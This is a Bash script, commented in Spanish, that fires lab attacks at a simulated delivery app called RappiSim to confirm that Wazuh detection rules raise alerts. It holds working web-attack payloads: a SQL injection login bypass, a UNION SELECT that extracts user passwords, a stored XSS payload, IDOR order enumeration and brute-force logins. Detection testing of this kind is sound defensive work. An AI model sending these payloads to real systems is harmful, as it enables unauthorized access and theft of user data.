#!/usr/bin/env bash
# =============================================================================
# PASO 3 - Lanzar los ataques de laboratorio contra RappiSim (SOLO nuestra app)
# para comprobar que Wazuh genera las alertas.
#
# Uso:
#   bash simular_ataques.sh https://rappi-web-simulada-xxxxx.us-central1.run.app
#
# Alertas esperadas en Wazuh (1-2 min después, filtro: rule.groups: rappisim):
#   100110  SQLi en login              (nivel 12)
#   100111  SQLi UNION en buscador     (nivel 12)
#   100120  XSS almacenado en reseñas  (nivel 10)
#   100131  IDOR enumeración pedidos   (nivel 10)
#   100141  Fuerza bruta en login      (nivel 10)
# =============================================================================
set -uo pipefail
URL="${1:?Uso: bash simular_ataques.sh <URL_DE_CLOUD_RUN>}"
URL="${URL%/}"

paso() { printf '\n\033[1m>> %s\033[0m\n' "$1"; }
code() { curl -s -o /dev/null -w '   HTTP %{http_code}\n' "$@"; }

paso "1. SQL Injection - bypass de login"
code -X POST "$URL/api/login" -H 'Content-Type: application/json' \
  -d "{\"email\":\"' OR '1'='1' --\",\"password\":\"cualquiercosa\"}"

paso "2. SQL Injection - UNION SELECT en el buscador"
code -G "$URL/api/productos" \
  --data-urlencode "q=' UNION SELECT id, email, password, 99.9, rol FROM users --"

paso "3. Stored XSS en reseñas"
code -X POST "$URL/api/resenas" -H 'Content-Type: application/json' \
  -d '{"autor":"tester-soc","comentario":"<img src=x onerror=\"alert(1)\">"}'

paso "4. IDOR - recorrer pedidos de otros clientes (1 a 6)"
for i in 1 2 3 4 5 6; do code "$URL/api/pedidos/$i"; sleep 1; done

paso "5. Fuerza bruta - 7 logins fallidos"
for i in $(seq 1 7); do
  code -X POST "$URL/api/login" -H 'Content-Type: application/json' \
    -d "{\"email\":\"admin@rappi.com\",\"password\":\"intento$i\"}"
done

cat <<'EOF'

Listo. Espera 1-2 minutos y revisa en el dashboard de Wazuh:
  Threat Hunting / Discover  ->  rule.groups: rappisim
Nota: la reseña XSS queda guardada en la BD; bórrala después si molesta en la demo.
EOF
